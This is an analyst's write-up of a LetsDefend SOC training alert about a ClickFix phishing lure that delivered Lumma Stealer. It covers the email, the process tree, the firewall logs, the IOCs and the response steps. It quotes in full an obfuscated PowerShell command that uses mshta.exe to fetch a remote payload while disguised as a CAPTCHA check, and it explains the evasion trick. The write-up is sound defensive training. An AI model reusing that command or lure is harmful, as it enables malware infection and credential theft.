# SOC338 – Lumma Stealer ClickFix Phishing

**Platform:** LetsDefend | **Severity:** Critical | **Classification:** True Positive | **Date:** March 13, 2025
**Host:** `172.16.17.216` | **User:** `dylan@letsdefend.io`

## Summary

A phishing email offering a free Windows 11 Pro upgrade led the user to `windows-update.site`, which used a ClickFix lure to get the user to run a hidden PowerShell command. The command used `mshta.exe` to fetch a Lumma Stealer payload, and the firewall allowed the connection.

<img width="1574" height="547" alt="338-01-alert" src="https://github.com/user-attachments/assets/61a9f5b3-0b6c-4ebc-aecb-e02591db73f3" />

## The Attack

**ClickFix** is a social engineering technique that gets the victim to infect their own machine. The malicious page silently copies a command to the clipboard, then shows fake "verification" steps: press **Win+R**, press **Ctrl+V**, press **Enter**. The user thinks they're passing a CAPTCHA, but they're pasting and running the attacker's command. Because the user runs it themselves, it bypasses many browser and email protections.

**Lumma Stealer** is an infostealer sold as malware-as-a-service. It steals saved browser passwords, session cookies, and cryptocurrency wallets and sends them to the attacker.

## Timeline

| Time (endpoint) | Event |
| --- | --- |
| 02:44:00 | Phishing email delivered from `update@windows-update.site` |
| 23:26:08 | User visits `https://windows-update.site/` |
| 23:26:20 | `mshta.exe` (PID 7284) connects to `172.67.139.19:443`, allowed* |
| 23:26:31 | `powershell.exe` (PID 624) runs `mshta.exe` with the payload URL |
| 23:26:32 | Obfuscated version of the same command executes |

*Firewall log shows 16:26:20; log management is 7 hours behind endpoint time. The connection appearing before the PowerShell entries is a minor discrepancy between log sources.

## Investigation

### 1. Email Analysis

- **From:** `update@windows-update.site` (sender IP `132.232.40.201`)
- **Subject:** "Upgrade your system to Windows 11 Pro for FREE"
- **Gateway action:** Deleted

The email impersonated Microsoft, used a fake countdown timer for urgency, and pointed every "UPDATE NOW" link to `windows-update.site`, which VirusTotal flagged as malicious (10/93). The email body itself included the ClickFix steps.

<img width="1919" height="974" alt="338-02-alert" src="https://github.com/user-attachments/assets/96ab61b3-b3bb-4db5-9693-f5d132d081d2" />

### 2. Endpoint Analysis

Browser history confirms the visit to `windows-update.site` at 23:26:08.



<img width="1547" height="714" alt="338-history" src="https://github.com/user-attachments/assets/46830a24-ec85-41dc-b824-423b69ec3920" />

At 23:26:19, the user ran the ClickFix command from the Run dialog:

```
PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''
```

- `-w 1` runs PowerShell with a hidden window.
- `-replace ']'` strips the brackets, rebuilding `mshta.exe` so the name never appears in plain text (evades simple detection).
- Everything after `#` is a comment. It's what the user sees at the end of the Run box, making the command look like a CAPTCHA check.

- <img width="544" height="406" alt="SOC-338-secondpage" src="https://github.com/user-attachments/assets/f40432b4-2952-450b-8342-f7762f1d9393" />
<img width="560" height="447" alt="SOC338-ProcessesView" src="https://github.com/user-attachments/assets/dc098e5e-c703-4a43-b96f-da40394efbdb" />

<img width="767" height="258" alt="SOC-338-captcha" src="https://github.com/user-attachments/assets/ee25935c-cd44-4092-8638-45edab134e0e" />

<img width="1225" height="520" alt="338-terminal" src="https://github.com/user-attachments/assets/ef98cb5d-eaa3-4944-9ccf-207ef88a08dc" />

The process logs show the full chain:

```
userinit.exe
└─ explorer.exe (PID 6920)
   └─ powershell.exe (PID 624)    obfuscated ClickFix command
      └─ powershell.exe (PID 7308)  -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"
         └─ mshta.exe (PID 7284)      fetches the payload
            └─ conhost.exe
```

<img width="707" height="167" alt="SOC338-PS624" src="https://github.com/user-attachments/assets/8159e2fb-5375-42c4-b1b2-77b1736d4014" />
<img width="675" height="205" alt="SOC338-PS7308" src="https://github.com/user-attachments/assets/87d18735-339a-422d-b7d3-17eac6aa18ea" />
<img width="525" height="206" alt="SOC338-mshta7284" src="https://github.com/user-attachments/assets/c21e73ce-6369-4f2a-bf73-acfe60bae780" />

`explorer.exe` as the parent of PID 624 confirms the user ran the command manually from the Run dialog. `mshta.exe` is a legitimate Windows binary for running HTML Applications, abused here to execute remote code, and the `.mp4` extension disguises the payload. Its `conhost.exe` child suggests the payload may have started a console process. Later log entries for PIDs 624 and 7308 (23:26:31–32) are repeat events for the same processes, not a second execution. All processes ran as `EC2AMAZ-ILGVOIN\LetsDefend`.

<img width="1392" height="710" alt="338-03" src="https://github.com/user-attachments/assets/44297761-1ad2-4e93-98af-a899aa00908c" />
### 3. Network Analysis

Firewall logs show `mshta.exe` (PID 7284) making an allowed HTTPS connection from `172.16.17.216:34211` to `172.67.139.19:443`, with a request URL matching the payload. The IP is in Cloudflare's range, so it fronts the attacker's server rather than identifying it directly.

<img width="1559" height="623" alt="338-network" src="https://github.com/user-attachments/assets/d78d5aff-77d0-4928-aaca-49dc7676f459" />

## Indicators of Compromise

| Type | Indicator |
| --- | --- |
| Sender Address | `update@windows-update.site` |
| Sender IP | `132.232.40.201` |
| Phishing Domain | `windows-update.site` |
| Payload URL | `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` |
| Payload Server IP | `172.67.139.19` (Cloudflare) |

## Response and Recommendations

Host `172.16.17.216` was contained. Next steps: reimage the host, reset the user's credentials and revoke active sessions (Lumma targets saved passwords and cookies), block the IOCs, and train users that legitimate sites never ask them to paste commands into the Run dialog.

## Conclusion

**True Positive.** The user executed a malicious ClickFix command, and the connection to the payload server was allowed. Lumma Stealer execution, C2 communication, and data exfiltration were not confirmed, but credential compromise should be assumed.

**MITRE ATT&CK:** T1566.002 (Spearphishing Link), T1204.004 (Malicious Copy and Paste), T1059.001 (PowerShell), T1027 (Obfuscation), T1218.005 (Mshta)
